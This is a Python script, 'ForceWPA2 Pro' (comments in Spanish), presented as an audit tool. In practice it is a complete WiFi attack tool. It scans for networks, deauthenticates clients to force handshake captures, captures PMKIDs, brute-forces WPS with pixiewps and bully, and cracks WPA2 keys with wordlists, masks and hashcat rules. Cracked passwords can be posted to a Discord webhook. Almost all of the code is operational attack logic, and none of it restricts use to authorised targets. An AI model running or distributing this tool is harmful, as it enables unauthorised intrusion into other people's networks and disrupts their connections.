#!/usr/bin/env python3
"""
ForceWPA2 Pro - Herramienta avanzada de auditoría WPA2
Modos: Handshake/PMKID capture, GPU brute force, WPS, Máscaras, Reglas
"""

import subprocess
import os
import sys
import time
import argparse
import signal
import re
import json
import threading
from datetime import datetime

# Colores
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# Configuración global
CONFIG = {
    'deauth_intensity': 3,
    'max_time': 0,
    'verbose': False,
    'output_file': None,
    'notify': False
}

def log(msg, level="INFO"):
    """Logging con timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    color = {
        "INFO": CYAN,
        "SUCCESS": GREEN,
        "WARNING": YELLOW,
        "ERROR": RED
    }.get(level, RESET)
    
    print(f"{color}[{timestamp}] [{level}] {msg}{RESET}")
    
    if CONFIG['output_file']:
        with open(CONFIG['output_file'], 'a') as f:
            f.write(f"[{timestamp}] [{level}] {msg}\n")

def notify_success(password, bssid, essid):
    """Notificaciones al encontrar contraseña"""
    msg = f"\n{ GREEN}🎉 CONTRASEÑA ENCONTRADA! 🎉{RESET}\n"
    msg += f"  Red: {essid}\n  BSSID: {bssid}\n  Password: {GREEN}{password}{RESET}\n"
    print(msg)
    
    if CONFIG['notify']:
        # Beep sonido
        print('\a')
        
        # Intentar notificación desktop (Linux)
        try:
            subprocess.run(f'notify-send "ForceWPA2" "Contraseña encontrada: {password}"', shell=True)
        except:
            pass
        
        # Discord webhook (si configurado)
        webhook_url = os.getenv('DISCORD_WEBHOOK')
        if webhook_url:
            import requests
            requests.post(webhook_url, json={"content": f"🎯 {essid} ({bssid}) -> `{password}`"})

def run_cmd(cmd, shell=True, timeout=None):
    """Ejecuta comando con timeout y verbose"""
    if CONFIG['verbose']:
        log(f"Ejecutando: {cmd}", "DEBUG")
    
    try:
        if timeout:
            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
        else:
            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        log(f"Timeout en comando: {cmd}", "WARNING")
        return "", "Timeout", 124
    except Exception as e:
        return "", str(e), 1

def check_dependencies():
    """Verifica dependencias (ahora incluye más herramientas)"""
    log("Verificando dependencias...", "INFO")
    
    core_deps = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng']
    optional_deps = {
        'hashcat': 'GPU cracking',
        'hcxdumptool': 'PMKID capture',
        'hcxpcapngtool': 'Hash conversion',
        'bully': 'WPS attack',
        'pixiewps': 'WPS vulnerability'
    }
    
    missing_core = []
    for dep in core_deps:
        _, _, code = run_cmd(f"which {dep}")
        if code != 0:
            missing_core.append(dep)
    
    if missing_core:
        log(f"Faltan dependencias core: {', '.join(missing_core)}", "ERROR")
        log(f"Instalar: sudo apt install {' '.join(missing_core)}", "INFO")
        return False
    
    log("Aircrack-ng suite: OK", "SUCCESS")
    
    # Verificar opcionales
    available = {}
    for dep, desc in optional_deps.items():
        _, _, code = run_cmd(f"which {dep}")
        available[dep] = (code == 0)
        if available[dep]:
            log(f"{dep} disponible ({desc})", "SUCCESS")
        else:
            log(f"{dep} no instalado (opcional para {desc})", "WARNING")
    
    return True, available

def enable_monitor_mode(interface):
    """Activa modo monitor con manejo de errores"""
    log(f"Activando modo monitor en {interface}...", "INFO")
    
    run_cmd("sudo airmon-ng check kill")
    stdout, stderr, code = run_cmd(f"sudo airmon-ng start {interface}")
    
    if code != 0:
        log(f"Error al activar modo monitor: {stderr}", "ERROR")
        return None
    
    match = re.search(r'(\w+mon)', stdout)
    if match:
        mon_iface = match.group(1)
        log(f"Modo monitor activado: {mon_iface}", "SUCCESS")
        return mon_iface
    
    return f"{interface}mon" if interface.endswith('mon') else None

def capture_pmkid(interface, bssid, channel):
    """Captura PMKID (más rápido, no requiere clients)"""
    log("Intentando capturar PMKID...", "INFO")
    
    run_cmd(f"sudo iwconfig {interface} channel {channel}")
    output_file = f"/tmp/pmkid_{bssid.replace(':', '')}"
    
    cmd = f"sudo hcxdumptool -i {interface} -o {output_file}.pcapng --enable_status=1 -c {channel} -t 60 --filterlist={bssid} --filtermode=2"
    
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(45)
    proc.terminate()
    
    # Convertir a formato hashcat
    hash_file = f"{output_file}.22000"
    run_cmd(f"sudo hcxpcapngtool -o {hash_file} {output_file}.pcapng 2>/dev/null")
    
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        log(f"PMKID capturado: {hash_file}", "SUCCESS")
        return hash_file
    
    log("No se pudo capturar PMKID", "WARNING")
    return None

def wps_attack(interface, bssid, channel):
    """Ataque WPS con bully/pixiewps"""
    log(f"Iniciando ataque WPS contra {bssid}...", "INFO")
    
    # Primero probar pixiewps (vulnerabilidad conocida)
    log("Probando vulnerabilidad Pixie Dust...", "INFO")
    stdout, _, code = run_cmd(f"sudo pixiewps --air --bssid {bssid} --channel {channel} --interface {interface}")
    
    if "WPS pin" in stdout and "WPA password" in stdout:
        match = re.search(r'WPA password:\s*"([^"]+)"', stdout)
        if match:
            password = match.group(1)
            log(f"WPS PIXIE DUST EXITOSO! Contraseña: {password}", "SUCCESS")
            return password
    
    # Fallback a bully (brute force de pines)
    log("Probando brute force de pines con bully...", "INFO")
    stdout, _, code = run_cmd(f"sudo bully {interface} -b {bssid} -c {channel} -L -T 30 -t 3")
    
    if "PIN" in stdout and "Key" in stdout:
        match = re.search(r'Key\s*:\s*"([^"]+)"', stdout)
        if match:
            password = match.group(1)
            log(f"WPS BULLY EXITOSO! Contraseña: {password}", "SUCCESS")
            return password
    
    log("Ataque WPS fallido", "WARNING")
    return None

def capture_handshake(mon_iface, target_bssid, target_channel, target_essid):
    """Captura handshake WPA2 con deauth adaptativo"""
    log(f"Apuntando a {target_essid} ({target_bssid}) canal {target_channel}", "INFO")
    
    run_cmd(f"sudo iwconfig {mon_iface} channel {target_channel}")
    
    capture_file = f"/tmp/handshake_{target_bssid.replace(':', '')}"
    cmd_capture = f"sudo airodump-ng {mon_iface} --bssid {target_bssid} -c {target_channel} -w {capture_file} --output-format pcap"
    capture_proc = subprocess.Popen(cmd_capture, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    log("Esperando handshake...", "INFO")
    handshake_detected = False
    start_time = time.time()
    deauth_attempts = 0
    
    while time.time() - start_time < 60:
        stdout, _, _ = run_cmd(f"sudo aircrack-ng {capture_file}-01.cap 2>/dev/null | grep -i 'handshake'")
        if '1 handshake' in stdout or 'handshake found' in stdout.lower():
            handshake_detected = True
            break
        
        # Deauth adaptativo según intensidad configurada
        if time.time() - start_time > 5 + (deauth_attempts * 2):
            deauth_attempts += 1
            packets = CONFIG['deauth_intensity'] * 2
            log(f"Lanzando deauth (intento {deauth_attempts}, {packets} paquetes)...", "INFO")
            run_cmd(f"sudo aireplay-ng -0 {packets} -a {target_bssid} {mon_iface}")
            time.sleep(3)
        
        time.sleep(1)
    
    capture_proc.terminate()
    time.sleep(1)
    
    if handshake_detected:
        log(f"Handshake capturado! Archivo: {capture_file}-01.cap", "SUCCESS")
        return f"{capture_file}-01.cap"
    else:
        log("No se capturó handshake", "ERROR")
        return None

def crack_with_mask(handshake_file, mask, hashcat_available):
    """Ataque por máscara (ej: ?d?d?d?d para 4 dígitos)"""
    if not hashcat_available:
        log("Hashcat necesario para ataques de máscara", "ERROR")
        return None
    
    log(f"Iniciando ataque por máscara: {mask}", "INFO")
    
    # Convertir a formato hashcat
    hc_file = handshake_file.replace('.cap', '.22000')
    run_cmd(f"hcxpcapngtool -o {hc_file} {handshake_file} 2>/dev/null")
    
    if not os.path.exists(hc_file):
        log("Error en conversión", "ERROR")
        return None
    
    cmd = f"hashcat -m 22000 {hc_file} -a 3 {mask} -O"
    
    if CONFIG['max_time'] > 0:
        cmd = f"timeout {CONFIG['max_time']} {cmd}"
    
    stdout, _, code = run_cmd(cmd)
    
    if 'Cracked' in stdout or 'Recovered' in stdout:
        stdout_show, _, _ = run_cmd(f"hashcat -m 22000 {hc_file} --show")
        parts = stdout_show.strip().split(':')
        if len(parts) >= 2:
            password = parts[1]
            log(f"Máscara exitosa! Contraseña: {password}", "SUCCESS")
            return password
    
    return None

def crack_with_wordlist(handshake_file, wordlist, use_hashcat=False):
    """Crackeo con wordlist (aircrack o hashcat)"""
    log(f"Iniciando crackeo con diccionario: {wordlist}", "INFO")
    
    if use_hashcat:
        hc_file = handshake_file.replace('.cap', '.22000')
        run_cmd(f"hcxpcapngtool -o {hc_file} {handshake_file} 2>/dev/null")
        
        if not os.path.exists(hc_file):
            log("Error en conversión para hashcat", "ERROR")
            return None
        
        cmd = f"hashcat -m 22000 {hc_file} {wordlist} -O"
        
        if CONFIG['max_time'] > 0:
            cmd = f"timeout {CONFIG['max_time']} {cmd}"
        
        stdout, _, _ = run_cmd(cmd)
        
        if 'Cracked' in stdout or 'Recovered' in stdout:
            stdout_show, _, _ = run_cmd(f"hashcat -m 22000 {hc_file} --show")
            parts = stdout_show.strip().split(':')
            if len(parts) >= 2:
                password = parts[1]
                log(f"Contraseña encontrada (hashcat): {password}", "SUCCESS")
                return password
    else:
        # Aircrack-ng
        cmd = f"aircrack-ng -w {wordlist} {handshake_file}"
        
        if CONFIG['max_time'] > 0:
            cmd = f"timeout {CONFIG['max_time']} {cmd}"
        
        stdout, _, _ = run_cmd(cmd)
        
        if 'KEY FOUND' in stdout:
            match = re.search(r'KEY FOUND! \[ (.*) \]', stdout)
            if match:
                password = match.group(1)
                log(f"Contraseña encontrada (aircrack): {password}", "SUCCESS")
                return password
    
    return None

def multiple_wordlists(handshake_file, wordlists, use_hashcat=False):
    """Prueba múltiples diccionarios en cascada"""
    for wl in wordlists:
        if os.path.exists(wl):
            log(f"Probando diccionario: {wl}", "INFO")
            result = crack_with_wordlist(handshake_file, wl, use_hashcat)
            if result:
                return result
        else:
            log(f"Diccionario no encontrado: {wl}", "WARNING")
    return None

def scan_networks(mon_iface, timeout=15):
    """Escanea redes y retorna lista"""
    log(f"Escaneando redes durante {timeout}s...", "INFO")
    
    cmd = f"sudo timeout {timeout} airodump-ng {mon_iface} --output-format csv -w /tmp/scan"
    run_cmd(cmd)
    
    networks = []
    try:
        with open('/tmp/scan-01.csv', 'r') as f:
            for line in f:
                if line.startswith(' BSSID') or 'Station' in line or 'Probe' in line:
                    continue
                parts = line.split(',')
                if len(parts) > 13 and parts[0].strip() and ':' in parts[0]:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    if essid and essid != '(hidden)' and len(essid) > 0:
                        # Detectar si tiene WPS
                        wps_match = re.search(r'WPS', line, re.IGNORECASE)
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid,
                            'wps': bool(wps_match)
                        })
    except Exception as e:
        log(f"Error parseando escaneo: {e}", "DEBUG")
    
    # Mostrar resultados
    if networks:
        log(f"Redes encontradas: {len(networks)}", "SUCCESS")
        for i, net in enumerate(networks):
            wps_tag = f" {CYAN}[WPS]{RESET}" if net['wps'] else ""
            print(f"  {i+1}. {net['essid']}{wps_tag} - {net['bssid']} (canal {net['channel']})")
    else:
        log("No se encontraron redes", "WARNING")
    
    return networks

def main():
    parser = argparse.ArgumentParser(
        description='ForceWPA2 Pro - Herramienta avanzada de auditoría WiFi',
        epilog="""
Ejemplos:
  forcewpa2.py -i wlan0 --scan-only
  forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -w rockyou.txt
  forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --mask ?d?d?d?d?d?d?d?d --gpu
  forcewpa2.py -i wlan0 --pmkid  # Captura PMKID
  forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wps  # Ataque WPS
  forcewpa2.py -i wlan0 --targets lista.txt --multi
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Opciones básicas
    parser.add_argument('-i', '--interface', required=True, help='Interfaz WiFi (ej: wlan0)')
    parser.add_argument('-b', '--bssid', help='BSSID del objetivo')
    parser.add_argument('-c', '--channel', help='Canal del objetivo')
    
    # Modos de ataque
    parser.add_argument('-w', '--wordlist', help='Diccionario principal')
    parser.add_argument('--wordlists', nargs='+', help='Múltiples diccionarios en cascada')
    parser.add_argument('--mask', help='Ataque por máscara (ej: ?l?l?l?d?d?d?d)')
    parser.add_argument('--rules', help='Archivo de reglas hashcat (ej: best64.rule)')
    parser.add_argument('--pmkid', action='store_true', help='Capturar PMKID (no requiere clients)')
    parser.add_argument('--wps', action='store_true', help='Ataque WPS (bully/pixiewps)')
    
    # Modo avanzado
    parser.add_argument('--gpu', action='store_true', help='Usar GPU con hashcat')
    parser.add_argument('--multi', action='store_true', help='Múltiples objetivos (requiere --targets)')
    parser.add_argument('--targets', help='Archivo con lista de BSSIDs (uno por línea)')
    parser.add_argument('--handshake', help='Usar archivo .cap existente (saltar captura)')
    parser.add_argument('--resume', help='Resumir sesión anterior')
    
    # Configuración
    parser.add_argument('--deauth', type=int, choices=range(1,11), default=3, help='Intensidad de deauth (1-10, default: 3)')
    parser.add_argument('--max-time', type=int, default=0, help='Tiempo máximo de crackeo en segundos')
    parser.add_argument('--output', help='Guardar resultados en archivo (JSON/CSV)')
    parser.add_argument('--notify', action='store_true', help='Notificaciones al encontrar contraseña')
    parser.add_argument('--scan-only', action='store_true', help='Solo escanear redes')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    
    args = parser.parse_args()
    
    # Aplicar configuración global
    CONFIG['deauth_intensity'] = args.deauth
    CONFIG['max_time'] = args.max_time
    CONFIG['verbose'] = args.verbose
    CONFIG['output_file'] = args.output
    CONFIG['notify'] = args.notify
    
    # Banner
    print(f"""{MAGENTA}
    ╔═══════════════════════════════════════════════════════╗
    ║     ForceWPA2 Pro - Advanced WPA2/WPS Audit Tool      ║
    ║     GPU Ready | PMKID | Mask Attack | WPS             ║
    ╚═══════════════════════════════════════════════════════╝
    {RESET}""")
    
    # Verificar dependencias
    deps_ok, available = check_dependencies()
    if not deps_ok:
        sys.exit(1)
    
    # Manejar Ctrl+C
    def signal_handler(sig, frame):
        print(f"\n{RED}[!] Interrumpido por usuario{RESET}")
        if 'mon_iface' in globals() and mon_iface:
            run_cmd(f"sudo airmon-ng stop {mon_iface}")
            run_cmd("sudo systemctl restart NetworkManager")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    mon_iface = None
    target_bssid = args.bssid
    target_channel = args.channel
    target_essid = ""
    
    try:
        # Si solo escaneo
        if args.scan_only:
            mon_iface = enable_monitor_mode(args.interface)
            if mon_iface:
                scan_networks(mon_iface)
            return
        
        # Si es modo PMKID
        if args.pmkid:
            if not available.get('hcxdumptool'):
                log("hcxdumptool no instalado. Instalar con: sudo apt install hcxdumptool", "ERROR")
                return
            
            mon_iface = enable_monitor_mode(args.interface)
            if not mon_iface:
                return
            
            if not target_bssid:
                networks = scan_networks(mon_iface)
                if networks:
                    sel = int(input(f"{YELLOW}[?] Selecciona red: {RESET}")) - 1
                    target_bssid = networks[sel]['bssid']
                    target_channel = networks[sel]['channel']
            
            hash_file = capture_pmkid(mon_iface, target_bssid, target_channel)
            if hash_file:
                log("PMKID capturado exitosamente! Usa hashcat para crackear:", "SUCCESS")
                log(f"hashcat -m 22000 {hash_file} wordlist.txt", "INFO")
            return
        
        # Si es modo WPS
        if args.wps:
            if not available.get('bully'):
                log("bully no instalado. Instalar con: sudo apt install bully", "ERROR")
                return
            
            mon_iface = enable_monitor_mode(args.interface)
            if not mon_iface:
                return
            
            if not target_bssid:
                networks = scan_networks(mon_iface)
                # Filtrar solo redes con WPS
                wps_networks = [n for n in networks if n.get('wps')]
                if wps_networks:
                    for i, net in enumerate(wps_networks):
                        print(f"  {i+1}. {net['essid']} - {net['bssid']}")
                    sel = int(input(f"{YELLOW}[?] Selecciona red WPS: {RESET}")) - 1
                    target_bssid = wps_networks[sel]['bssid']
                    target_channel = wps_networks[sel]['channel']
                else:
                    log("No se encontraron redes con WPS activo", "ERROR")
                    return
            
            password = wps_attack(mon_iface, target_bssid, target_channel)
            if password:
                notify_success(password, target_bssid, "WPS_Target")
            return
        
        # Modo normal (handshake + crack)
        if not args.handshake:
            mon_iface = enable_monitor_mode(args.interface)
            if not mon_iface:
                return
            
            # Seleccionar objetivo si no se especificó
            if not target_bssid:
                networks = scan_networks(mon_iface)
                if not networks:
                    return
                
                sel = int(input(f"{YELLOW}[?] Selecciona red (1-{len(networks)}): {RESET}")) - 1
                target = networks[sel]
                target_bssid = target['bssid']
                target_channel = target['channel']
                target_essid = target['essid']
            else:
                target_essid = input(f"{YELLOW}[?] ESSID (nombre de red): {RESET}")
            
            # Capturar handshake
            handshake_file = capture_handshake(mon_iface, target_bssid, target_channel, target_essid)
        else:
            handshake_file = args.handshake
            log(f"Usando handshake existente: {handshake_file}", "INFO")
            if not os.path.exists(handshake_file):
                log("Archivo de handshake no encontrado", "ERROR")
                return
        
        if not handshake_file:
            log("No se pudo obtener handshake", "ERROR")
            return
        
        # Preparar diccionarios
        wordlists = []
        if args.wordlist:
            wordlists.append(args.wordlist)
        if args.wordlists:
            wordlists.extend(args.wordlists)
        
        # Diccionarios por defecto
        if not wordlists:
            default_wls = [
                '/usr/share/wordlists/rockyou.txt',
                './wordlists/rockyou.txt',
                '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt'
            ]
            for wl in default_wls:
                if os.path.exists(wl):
                    wordlists.append(wl)
                    break
        
        password = None
        
        # 1. Ataque con diccionario/s
        if wordlists:
            log(f"Usando {len(wordlists)} diccionario(s)", "INFO")
            password = multiple_wordlists(handshake_file, wordlists, args.gpu and available.get('hashcat'))
        
        # 2. Ataque por máscara si no se encontró y hay hashcat
        if not password and args.mask and available.get('hashcat'):
            password = crack_with_mask(handshake_file, args.mask, available.get('hashcat'))
        
        # 3. Ataque con reglas si no se encontró
        if not password and args.rules and available.get('hashcat') and wordlists:
            log(f"Aplicando reglas: {args.rules}", "INFO")
            hc_file = handshake_file.replace('.cap', '.22000')
            cmd = f"hashcat -m 22000 {hc_file} {wordlists[0]} -r {args.rules} -O"
            stdout, _, _ = run_cmd(cmd)
            if 'Cracked' in stdout:
                stdout_show, _, _ = run_cmd(f"hashcat -m 22000 {hc_file} --show")
                parts = stdout_show.strip().split(':')
                if len(parts) >= 2:
                    password = parts[1]
                    log(f"Reglas exitosas! Contraseña: {password}", "SUCCESS")
        
        if password:
            notify_success(password, target_bssid, target_essid)
            
            # Guardar resultado
            if args.output:
                result_data = {
                    'bssid': target_bssid,
                    'essid': target_essid,
                    'password': password,
                    'timestamp': datetime.now().isoformat(),
                    'method': 'wordlist' if wordlists else 'mask'
                }
                with open(args.output, 'w') as f:
                    json.dump(result_data, f, indent=2)
                log(f"Resultados guardados en {args.output}", "SUCCESS")
        else:
            log("No se encontró la contraseña con los métodos utilizados", "WARNING")
            log("Sugerencias: probar otro diccionario, usar --mask, o modo WPS", "INFO")
    
    finally:
        if mon_iface:
            run_cmd(f"sudo airmon-ng stop {mon_iface}")
            run_cmd("sudo systemctl restart NetworkManager")
            log("Limpieza completada", "INFO")

if __name__ == "__main__":
    main()
